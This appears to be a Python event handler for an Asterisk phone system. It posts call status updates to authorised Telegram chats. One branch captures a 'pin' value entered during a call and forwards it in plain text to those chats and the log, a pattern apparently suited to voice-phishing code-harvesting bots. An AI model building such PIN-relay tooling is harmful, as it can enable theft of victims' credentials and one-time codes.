# event_handler.py
from config import  user_data, logger
from json_handler import get_chats_ids
from telegram_handler import send_telegram_message
import re

def extract_extension(app_data):
    """
    Extrae la extensión del campo AppData de una cadena.
    
    Args:
        app_data (str): Cadena que contiene AppData, por ejemplo, "AppData='PJSIP/1001,120,m'".
        
    Returns:
        str: La extensión extraída (ej. '1001') o None si no se encuentra.
    """
    match = re.search(r"PJSIP/(\d+)", app_data)
    return match.group(1) if match else None

async def handle_user_event(manager, event):
    """Manejar eventos de Asterisk."""
    AUTHORIZED_CHAT_IDS =await get_chats_ids()
    event_type = event.Event
    channel = event.get('Channel')
    message = None
  
    if event_type == 'OriginateResponse' and event.get('Response') == 'Success':
        message = f"📞 Llamada conectada"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id]['channel'] = channel
    elif event_type == 'Newstate':
        state = event.get('ChannelStateDesc')
        if state == 'Ringing':
            message = f"🔔 Llamando..."
        elif state == 'Up':
            message = f"✅ En llamada"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id]['channel'] = channel
     # New block for Transfer event
       
    elif event_type == 'Newexten' and event.get('Application') == 'Dial':
        target_channel = extract_extension(event.get('AppData'))
        message = f"🔀 Transferendo llamada a {target_channel}"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id]['channel'] = target_channel

    elif event_type == 'VarSet' and event.get('Variable') == 'pin':
        pin_value = event.get('Value')
        if pin_value:
            message = f"🔑 PIN: {pin_value}"
            logger.info(message)
    elif event_type == 'Hangup':
        message = f"📴 Llamada terminada"
        logger.info(message)
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id] = {'step': 'idle'}
            user_data[chat_id].pop('channel', None)

    if message:
        for chat_id in AUTHORIZED_CHAT_IDS:
            try:
                await send_telegram_message(chat_id, message)
            except Exception as e:
                logger.error(f"Error al enviar mensaje: {e}")